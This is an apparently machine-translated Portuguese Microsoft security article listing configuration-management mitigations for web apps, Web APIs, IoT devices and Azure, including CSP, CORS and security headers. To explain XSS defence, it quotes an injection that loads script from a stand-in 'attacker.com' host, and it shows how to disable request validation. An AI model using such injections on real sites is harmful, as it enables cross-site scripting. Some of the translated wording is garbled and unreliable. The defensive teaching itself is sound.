---
title: Configuração Gestão - ferramenta de modelagem de ameaças da Microsoft - Azure | Documentos da Microsoft
description: atenuações para ameaças expostas na ferramenta de modelagem de ameaças
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: bd1d3c71660ae584b0aa57c7cc765fdc519f4b1b
ms.sourcegitcommit: 5839af386c5a2ad46aaaeb90a13065ef94e61e74
ms.translationtype: MT
ms.contentlocale: pt-PT
ms.lasthandoff: 03/19/2019
ms.locfileid: "57863598"
---
# <a name="security-frame-configuration-management--mitigations"></a>Quadro de segurança: Gestão de configuração | Atenuações 
| Produtos/serviços | Artigo |
| --------------- | ------- |
| **Aplicação Web** | <ul><li>[Implementar a política de segurança de conteúdos (CSP) e desativar inline javascript](#csp-js)</li><li>[Ativar o Filtro XSS do navegador](#xss-filter)</li><li>[Aplicativos ASP.NET tem de desativar o rastreio e a depuração antes da implantação](#trace-deploy)</li><li>[Acesso de terceiros javascripts da apenas origens confiáveis](#js-trusted)</li><li>[Certifique-se de que as páginas ASP.NET autenticadas incorporam Redressing de interface do Usuário ou defesas jacking de clique](#ui-defenses)</li><li>[Certifique-se de que apenas as origens confiáveis são permitidas se CORS está ativado em aplicativos da Web ASP.NET](#cors-aspnet)</li><li>[Ativar o atributo de ValidateRequest em páginas ASP.NET](#validate-aspnet)</li><li>[Utilizar alojado localmente versões mais recentes das bibliotecas de JavaScript](#local-js)</li><li>[Desativar a detecção automática de MIME](#mime-sniff)</li><li>[Remover os cabeçalhos de servidor padrão no Windows Azure Web Sites, para evitar a impressão digital](#standard-finger)</li></ul> |
| **Base de Dados** | <ul><li>[Configurar uma Firewall do Windows para acesso ao motor de base de dados](#firewall-db)</li></ul> |
| **API Web** | <ul><li>[Certifique-se de que apenas as origens confiáveis são permitidas se CORS está ativado na ASP.NET Web API](#cors-api)</li><li>[Encriptar secções dos arquivos de configuração da API Web que contêm dados confidenciais](#config-sensitive)</li></ul> |
| **Dispositivo IoT** | <ul><li>[Certifique-se de que todas as interfaces de administrador são protegidas com credenciais seguras](#admin-strong)</li><li>[Certifique-se de que o código desconhecido não pode executar em dispositivos](#unknown-exe)</li><li>[Encriptar o SO e partições adicionais do dispositivo de IoT com pouco cacifo](#partition-iot)</li><li>[Certifique-se de que apenas as mínimo serviços/funcionalidades estão ativadas nos dispositivos](#min-enable)</li></ul> |
| **Gateway de campo de IoT** | <ul><li>[Encriptar o SO e partições adicionais do Gateway de campo de IoT com pouco cacifo](#field-bit-locker)</li><li>[Certifique-se de que as credenciais de início de sessão padrão do gateway de campo são alteradas durante a instalação](#default-change)</li></ul> |
| **Gateway de Cloud da IoT** | <ul><li>[Certifique-se de que o Gateway de nuvem implementa um processo para manter o firmware de dispositivos ligados atualizado](#cloud-firmware)</li></ul> |
| **Limite de fidedignidade de máquina** | <ul><li>[Certifique-se de que os dispositivos têm controlos de segurança de ponto de extremidade configurados de acordo com as políticas organizacionais](#controls-policies)</li></ul> |
| **Armazenamento do Azure** | <ul><li>[Certifique-se a gestão segura das chaves de acesso de armazenamento do Azure](#secure-keys)</li><li>[Certifique-se de que apenas as origens confiáveis são permitidas se CORS está ativado no armazenamento do Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Ativar o serviço do WCF, limitação de recursos](#throttling)</li><li>[Divulgação de informações do WCF por meio de metadados](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementar a política de segurança de conteúdos (CSP) e desativar inline javascript

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | [Uma introdução à política de segurança do conteúdo](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [referência de política de segurança do conteúdo](https://content-security-policy.com/), [recursos de segurança](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [introdução à política de segurança do conteúdo](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [posso utilizar o CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Passos** | <p>Política de segurança de conteúdos (CSP) é um defesa em profundidade mecanismo de segurança, um W3C standard, que permite que os proprietários do aplicativo web ter controlo sobre o conteúdo incorporado no respetivo site. CSP é adicionado como um cabeçalho de resposta HTTP no servidor web e no lado do cliente, é imposto por navegadores. É uma política baseada na lista aprovada - um Web site pode declarar um conjunto de domínios fidedignos do qual conteúdo ativo, como o JavaScript pode ser carregado.</p><p>CSP fornece as seguintes vantagens de segurança:</p><ul><li>**Proteção contra XSS:** Se uma página é vulnerável a XSS, um invasor pode explorá-los de 2 formas:<ul><li>Injetar `<script>malicious code</script>`. Essa exploração não irá funcionar devido à Base da CSP restrição-1</li><li>Injetar `<script src=”http://attacker.com/maliciousCode.js”/>`. Essa exploração não funcionará, porque o domínio do invasor controlado não estarão disponíveis na lista de permissões do CSP de domínios</li></ul></li><li>**Controlo sobre exfiltração de dados:** Se tentar qualquer conteúdo malicioso numa página Web ligar a um Web site externo e roubar dados, a ligação será abortada pelo CSP. Isto acontece porque o domínio de destino não estarão disponíveis na lista de permissões do CSP</li><li>**Defesa contra jacking de clique:** jacking de clique é uma técnica de ataque com que um adversário pode estruturar um utilizadores original de Web site e força a clicar em elementos de interface do Usuário. Atualmente o defesa contra jacking de clique é feita ao configurar um cabeçalho-X-quadro-opções de resposta. Nem todos os navegadores respeitam esse cabeçalho e vai reencaminhar CSP será uma forma padrão de se Defender contra jacking de clique</li><li>**Relatórios de ataque em tempo real:** Se houver um ataque de injeção de um Web site com o CSP, navegadores acionará automaticamente uma notificação para um ponto final configurado no servidor da Web. Dessa forma, o CSP serve como um sistema de avisos em tempo real.</li></ul> |

### <a name="example"></a>Exemplo
Exemplo de política: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Esta política permite que os scripts carregar apenas a partir do aplicativo web server e servidor do google analytics. Scripts carregados a partir de outro site serão rejeitadas. Quando o CSP está ativado num Web site, as seguintes funcionalidades automaticamente estão desativadas para mitigar ataques XSS. 

### <a name="example"></a>Exemplo
Scripts de inline não serão executado. Seguem-se exemplos de inline scripts 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Exemplo
Cadeias de caracteres não serão avaliadas como código. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Ativar o Filtro XSS do navegador

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | [Filtro de proteção de XSS](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Passos** | <p>Configuração de cabeçalho de resposta de proteção de XSS X controla o filtro de script entre sites do navegador. Este cabeçalho de resposta pode ter valores a seguir:</p><ul><li>`0:` Este procedimento desativará o filtro</li><li>`1: Filter enabled` Se for detetado um ataque de script entre sites, para parar o ataque, o navegador irá limpar a página</li><li>`1: mode=block : Filter enabled`. Em vez disso, de limpar a página, quando é detetado um ataque XSS, o navegador impedirá o processamento da página</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. O navegador irá limpar a página e a violação de relatórios.</li></ul><p>Esta é uma função de Chromium utilizando os relatórios de violação do CSP para enviar detalhes para um URI de sua escolha. As opções de 2 últimas são consideradas valores seguros.</p>|

## <a id="trace-deploy"></a>Aplicativos ASP.NET tem de desativar o rastreio e a depuração antes da implantação

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | [Descrição geral de depuração do ASP.NET](https://msdn2.microsoft.com/library/ms227556.aspx), [descrição geral do rastreio de ASP.NET](https://msdn2.microsoft.com/library/bb386420.aspx), [como: Ativar o rastreio para uma aplicação ASP.NET](https://msdn2.microsoft.com/library/0x5wc973.aspx), [como: Ativar a depuração para aplicativos ASP.NET](https://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Passos** | Quando o rastreio está ativado para a página, todos os navegadores solicitando que ele também obtém as informações de rastreio que contém dados sobre o estado de servidor interno e o fluxo de trabalho. Essas informações podem ser confidencial de segurança. Quando a depuração está ativada para a página, erros acontecendo no servidor resultam num dados de rastreio de pilha completo apresentados no browser. Esses dados podem expor informações importantes de segurança sobre o fluxo de trabalho do servidor. |

## <a id="js-trusted"></a>Acesso de terceiros javascripts da apenas origens confiáveis

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | deve ser referenciada de terceiros JavaScripts apenas a partir de origens confiáveis. Os pontos de extremidade de referência devem ser sempre em SSL. |

## <a id="ui-defenses"></a>Certifique-se de que as páginas ASP.NET autenticadas incorporam Redressing de interface do Usuário ou defesas jacking de clique

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | [OWASP jacking clique de folha de referência de defesa](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [aspectos internos do IE - combate jacking de clique com o X-quadro-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Passos** | <p>Clique-jacking, também conhecido como um "interface do Usuário reparos ataque", é quando um atacante utiliza várias camadas opacas ou transparentes para enganar o usuário clicar num botão ou link em outra página, quando eles foram destinar clicar na página de nível superior.</p><p>Esta disposição em camadas é feita ao criar uma página maliciosa com um iframe, que carrega a página da vítima. Portanto, o invasor é "hijacking de" cliques se destina à sua página e encaminhamento-las para outra página, é muito provável que pertence a outro aplicativo, domínio ou ambos. Para evitar ataques jacking de clique, defina os cabeçalhos de resposta de HTTP X-quadro-Options adequados que instruir o navegador para não permitir delimitação de quadros de outros domínios</p>|

### <a name="example"></a>Exemplo
O cabeçalho X-quadro-OPTIONS pode ser definido via Web. config do IIS. Trecho de código de Web. config para sites que nunca deve ser estruturado: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exemplo
Código de Web. config para sites que só deve ser estruturado por páginas no mesmo domínio: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Certifique-se de que apenas as origens confiáveis são permitidas se CORS está ativado em aplicativos da Web ASP.NET

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Web Forms, MVC5 |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | <p>A segurança do browser impede que uma página Web realize pedidos de AJAX para outro domínio. Esta restrição denomina-se a política de mesma origem e impede que um site malicioso leia dados confidenciais de outro site. No entanto, às vezes, poderá ser necessário para expor as APIs com segurança os outros sites que podem consumir. Cruzado Origin Resource Sharing (CORS) é uma norma W3C que permite a um servidor reduzir a política de mesma origem. Utilizando a CORS, um servidor de pode permitir explicitamente o alguns pedidos de várias origens ao mesmo tempo que rejeita outros.</p><p>CORS é mais seguro e mais flexível do que as técnicas anteriores como JSONP. Em seu núcleo, ativar o CORS se traduz em adicionar alguns cabeçalhos de resposta HTTP (Access - Control-*) para a web application e isso podem ser feitos de duas formas.</p>|

### <a name="example"></a>Exemplo
Se o acesso à Web. config estiver disponível, o CORS podem ser adicionados através do seguinte código: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exemplo
Se o acesso à Web. config não estiver disponível, o CORS podem ser configuradas ao adicionar o seguinte código de CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Tenha em atenção que é fundamental para garantir que a lista de origens no atributo "Access-Control-Allow-Origin" está definida como um conjunto finito e confiável de origens. Falha ao configurar esta opção inadequadamente (por exemplo, definir o valor como "*") irá permitir que os sites mal-intencionados acionar pedidos transversais à aplicação web > sem quaisquer restrições, tornando o aplicativo vulnerável a ataques CSRF. 

## <a id="validate-aspnet"></a>Ativar o atributo de ValidateRequest em páginas ASP.NET

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Web Forms, MVC5 |
| **Atributos**              | N/A  |
| **Referências**              | [Pedido de validação - impedir ataques de Script](https://www.asp.net/whitepapers/request-validation) |
| **Passos** | <p>Pedido de validação, um recurso do ASP.NET desde a versão 1.1, impede que o servidor aceitar o conteúdo HTML não codificada que contêm. Esta funcionalidade foi concebida para ajudar a evitar alguns ataques de injeção de script no qual o código de script de cliente ou do HTML pode ser inconscientemente submetido a um servidor, armazenado e, em seguida, é apresentada a outros utilizadores. Recomendamos vivamente ainda que validar dados de entrada tudo e HTML codificá-lo quando for adequado.</p><p>Pedido de validação é executada ao comparar todos os dados de entrada para uma lista de valores potencialmente perigosas. Se ocorrer uma correspondência, o ASP.NET gera um `HttpRequestValidationException`. Por predefinição, a funcionalidade de validação do pedido está ativada.</p>|

### <a name="example"></a>Exemplo
No entanto, esta funcionalidade pode ser desativada no nível de página: 
```XML
<%@ Page validateRequest="false" %> 
```
ou, no nível de aplicativo 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Tenha em atenção de que essa funcionalidade de validação do pedido não é suportada e não faz parte do pipeline de MVC6. 

## <a id="local-js"></a>Utilizar alojado localmente versões mais recentes das bibliotecas de JavaScript

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | <p>Os desenvolvedores que usam bibliotecas JavaScript padrão, como JQuery tem de utilizar aprovado versões das bibliotecas comuns do JavaScript que não contêm falhas de segurança conhecidos. É uma boa prática utilizar a versão mais recente das bibliotecas, uma vez que eles contêm correções de segurança de vulnerabilidades conhecidas em suas versões mais antigas.</p><p>Se a versão mais recente não pode ser utilizada devido a motivos de compatibilidade, o abaixo versões mínimas deve ser utilizado.</p><p>Aceitáveis versões mínimas:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>Validar a JQuery 1.9</li><li>JQuery Mobile 1.0.1</li><li>Ciclo de JQuery 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX Control Toolkit**<ul><li>AJAX Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms e Ajax**<ul><li>ASP.NET Web Forms e Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nunca carregar qualquer biblioteca JavaScript a partir de sites externos, como as CDNs públicas</p>|

## <a id="mime-sniff"></a>Desativar a detecção automática de MIME

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | [IE8 Segurança parte v: Proteção abrangente](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [tipo de MIME](https://en.wikipedia.org/wiki/Mime_type) |
| **Passos** | O cabeçalho X-conteúdo-tipo-Options é um cabeçalho HTTP que permite que os desenvolvedores especifiquem que seu conteúdo não deve ser intercetados de MIME. Este cabeçalho é projetado para mitigar ataques de detecção de MIME. Para cada página que pode conter conteúdo controlável do utilizador, tem de utilizar o X de cabeçalho de HTTP-conteúdo-tipo-opções: nosniff. Para ativar o cabeçalho necessário globalmente para todas as páginas do aplicativo, pode fazer um dos seguintes|

### <a name="example"></a>Exemplo
Adicione o cabeçalho no ficheiro Web. config, se o aplicativo é hospedado por informações de serviços Internet (IIS) 7 e posteriores. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exemplo
Adicionar cabeçalho através do aplicativo global\_BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exemplo
Módulo HTTP personalizado de implementar 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exemplo
Pode ativar o cabeçalho necessário apenas para páginas específicas ao adicioná-la para as respostas individuais: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Remover os cabeçalhos de servidor padrão no Windows Azure Web Sites, para evitar a impressão digital

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | EnvironmentType - Azure |
| **Referências**              | [Remover os cabeçalhos de servidor padrão no Windows Azure Web Sites](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Passos** | Cabeçalhos, como o servidor, X-com tecnologia-por, X-AspNet-Version revelam informações sobre o servidor e as tecnologias subjacentes. É recomendado para suprimir esses cabeçalhos, assim, impedir a impressão digital do aplicativo |

## <a id="firewall-db"></a>Configurar uma Firewall do Windows para acesso ao motor de base de dados

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Base de Dados | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | SQL Azure, OnPrem |
| **Atributos**              | N/d, a versão do SQL - V12 |
| **Referências**              | [Como configurar uma firewall de base de dados SQL do Azure](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [configurar uma Firewall do Windows para acesso ao motor de base de dados](https://msdn.microsoft.com/library/ms175043) |
| **Passos** | Sistemas de firewall ajudam a impedir o acesso não autorizado a recursos de computador. Para aceder a uma instância do motor de base de dados do SQL Server através de uma firewall, terá de configurar a firewall no computador com o SQL Server para permitir o acesso |

## <a id="cors-api"></a>Certifique-se de que apenas as origens confiáveis são permitidas se CORS está ativado na ASP.NET Web API

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 5 |
| **Atributos**              | N/A  |
| **Referências**              | [Ativar pedidos de várias origens na ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - suporte do CORS na ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Passos** | <p>A segurança do browser impede que uma página Web realize pedidos de AJAX para outro domínio. Esta restrição denomina-se a política de mesma origem e impede que um site malicioso leia dados confidenciais de outro site. No entanto, às vezes, poderá ser necessário para expor as APIs com segurança os outros sites que podem consumir. Cruzado Origin Resource Sharing (CORS) é uma norma W3C que permite a um servidor reduzir a política de mesma origem.</p><p>Utilizando a CORS, um servidor de pode permitir explicitamente o alguns pedidos de várias origens ao mesmo tempo que rejeita outros. CORS é mais seguro e mais flexível do que as técnicas anteriores como JSONP.</p>|

### <a name="example"></a>Exemplo
Em app_start, adicione o seguinte código ao método Webapiconfig. 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exemplo
Atributo EnableCors pode ser aplicado a métodos de ação num controlador da seguinte forma: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Tenha em atenção que é fundamental para garantir que a lista de origens no atributo EnableCors está definida como um conjunto finito e confiável de origens. Uma falha ao configurar isto inadequadamente (por exemplo, definir o valor como "*") irá permitir que os sites mal-intencionados acionar pedidos transversais à API sem quaisquer restrições > que faz a API vulnerável a ataques CSRF. Pode ser decoradas EnableCors no nível de controlador. 

### <a name="example"></a>Exemplo
Para desativar o CORS num método particular numa classe, pode ser utilizado o atributo DisableCors conforme mostrado abaixo: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 6 |
| **Atributos**              | N/A  |
| **Referências**              | [Ativar pedidos de várias origens (CORS) no ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Passos** | <p>No ASP.NET Core 1.0, o CORS pode ser ativado usando middleware ou com o MVC. Ao usar o MVC para ativar o CORS os mesmos serviços CORS são utilizados, mas não é o middleware CORS.</p>|

**Abordagem 1** ativar o CORS com middleware: Para ativar o CORS para toda a aplicação adicionar o middleware CORS para o pipeline de solicitação usando o método de extensão UseCors. Uma política de várias origens pode ser especificada ao adicionar o middleware CORS usando a classe CorsPolicyBuilder. Existem duas formas de fazer isso:

### <a name="example"></a>Exemplo
A primeira é chamar UseCors com um lambda. O lambda usa um objeto de CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exemplo
O segundo consiste em definir uma ou mais políticas CORS com nome e, em seguida, selecione a política de por nome em tempo de execução. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Abordagem 2** ativar o CORS no MVC: Os desenvolvedores em alternativa podem usar o MVC para aplicar o CORS específicos por ação, por controlador ou globalmente para todos os controladores.

### <a name="example"></a>Exemplo
Por ação: Para especificar um CORS política para uma ação específica, adicione o atributo [EnableCors] para a ação. Especifique o nome da política. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exemplo
Por controlador: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exemplo
Global: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Tenha em atenção que é fundamental para garantir que a lista de origens no atributo EnableCors está definida como um conjunto finito e confiável de origens. Uma falha ao configurar isto inadequadamente (por exemplo, definir o valor como "*") irá permitir que os sites mal-intencionados acionar pedidos transversais à API sem quaisquer restrições > que faz a API vulnerável a ataques CSRF. 

### <a name="example"></a>Exemplo
Para desativar o CORS para um controlador ou ação, utilize o atributo [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Encriptar secções dos arquivos de configuração da API Web que contêm dados confidenciais

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | [How To: Encriptar secções de configuração no ASP.NET 2.0 usando o DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [especificação de um fornecedor de configuração protegida](https://msdn.microsoft.com/library/68ze1hb2.aspx), [utilizando o Azure Key Vault para proteger segredos da aplicação](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Passos** | Arquivos de configuração, tais como o Web. config appSettings costumam ser usados para armazenar informações confidenciais, incluindo os nomes de utilizador, palavras-passe, cadeias de ligação de base de dados e chaves de encriptação. Se não proteger essas informações, a aplicação está vulnerável a atacantes ou obtenção de informações confidenciais, como nomes de conta de utilizador e palavras-passe, nomes de base de dados e os nomes dos servidores que usuários mal-intencionados. Com base no tipo de implementação (azure/no local), criptografe as seções confidenciais dos ficheiros de configuração com DPAPI ou serviços, como o Azure Key Vault. |

## <a id="admin-strong"></a>Certifique-se de que todas as interfaces de administrador são protegidas com credenciais seguras

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | Qualquer interfaces administrativas que expõe o gateway de dispositivo ou o campo devem ser protegidos com as credenciais fortes. Além disso, quaisquer outras interfaces expostas como Wi-Fi, SSH, partilhas de ficheiros, FTP deve ser protegido por credenciais seguras. Não devem ser utilizadas a predefinição de senhas fracas. |

## <a id="unknown-exe"></a>Certifique-se de que o código desconhecido não pode executar em dispositivos

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | [Ativar o arranque seguro e pouco cacifo de encriptação de dispositivos no Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Passos** | O arranque seguro UEFI restringe o sistema para permitir apenas a execução dos binários assinado por uma autoridade especificada. Esta funcionalidade impede que desconhecido de código a ser executados na plataforma e potencialmente enfraquecer a postura de segurança do mesmo. Ativar o arranque seguro UEFI e restringir a lista de autoridades de certificação confiáveis para a assinatura de código. Inicie a sessão de todo o código que é implementado no dispositivo com uma das autoridades fidedignas. |

## <a id="partition-iot"></a>Encriptar o SO e partições adicionais do dispositivo de IoT com pouco cacifo

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | Windows 10 IoT Core implementa uma versão simples pouco cacifo de encriptação do dispositivo, que tem uma forte dependência na presença de um TPM na plataforma, incluindo o protocolo necessário preOS em UEFI que realiza as medidas necessárias. Essas medidas preOS Certifique-se de que o sistema operacional tem mais tarde um registo definitivo de como o sistema operacional foi iniciado. Encripte as partições de sistema operacional usando o pouco cacifo e quaisquer partições adicionais também caso eles armazenam os dados confidenciais. |

## <a id="min-enable"></a>Certifique-se de que apenas as mínimo serviços/funcionalidades estão ativadas nos dispositivos

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
